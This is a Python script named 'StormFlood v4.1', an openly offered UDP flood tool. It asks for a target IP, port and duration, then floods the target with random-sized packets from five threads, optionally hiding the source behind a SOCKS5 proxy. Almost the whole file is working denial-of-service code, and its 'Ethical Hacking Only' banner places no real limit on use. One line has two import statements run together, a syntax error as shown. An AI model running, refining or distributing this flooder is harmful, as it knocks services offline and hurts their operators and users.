#!/usr/bin/env python3
# StormFlood v4.1 - Ultimate Auto UDP Flood Tool
# @hiden_25
import socket
import os                                                  import random
import time
import threading
import socks
from datetime import datetime

# Colors
B = '\033[1m'
R = '\033[31m'
G = '\033[32m'
Y = '\033[33m'
N = '\033[0m'

# ASCII Banner
def banner():
    os.system("clear")
    print(B + R + """
 ███████╗████████╗ ██████╗ ███╗   ███╗███████╗
 ██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝
 ███████╗   ██║   ██║   ██║██╔████╔██║███████╗
 ╚════██║   ██║   ██║   ██║██║╚██╔╝██║╚════██║
 ███████║   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║
 ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝
 """ + N)
    print(f"{Y}[#] StormFlood v4.1 - Auto UDP Flood Tool")
    print(f"{Y}[#] Developed by: {G}@hiden_25 | H2I CODER | CEO DEVELOPER{N}")
    print("\n" + R + "# Stay Anonymous - Ethical Hacking Only\n" + N)

# Generate Random Packet Size
def generate_packet():
    size = random.randint(512, 2048)
    return random._urandom(size)

# UDP Flood Attack
def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = generate_packet()
    start_time = time.time()

    while time.time() - start_time < duration:
        sock.sendto(packet, (ip, port))
        print(f"[→] Sent UDP packet to {ip} through port: {port}")

# Proxy Setup (Optional)
def setup_proxy(proxy_ip, proxy_port):
    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    socket.socket = socks.socksocket
    print(f"{G}[✔] Proxy Activated: {proxy_ip}:{proxy_port}{N}")

# Start Attack
def start_attack(ip, port, duration):
    print(f"{G}[✔] StormFlood v4.1 Attack Started on {ip} at {port} for {duration} seconds.{N}")

    threads = []
    for _ in range(5):  # Multi-threading for faster attack
        thread = threading.Thread(target=udp_flood, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{G}[✔] Attack Finished!{N}")

# Main Function
def main():
    banner()

    ip = input(f"{Y}[$] Target IP: {N}")
    port = int(input(f"{Y}[$] Enter Port (Default: 80): {N}") or 80)
    duration = int(input(f"{Y}[$] Enter Attack Duration (seconds): {N}"))

    use_proxy = input(f"{Y}[?] Use Proxy? (y/n): {N}").lower()
    if use_proxy == "y":
        proxy_ip = input(f"{Y}[$] Proxy IP: {N}")
        proxy_port = int(input(f"{Y}[$] Proxy Port: {N}"))
        setup_proxy(proxy_ip, proxy_port)

    start_attack(ip, port, duration)

if __name__ == "__main__":
    main()
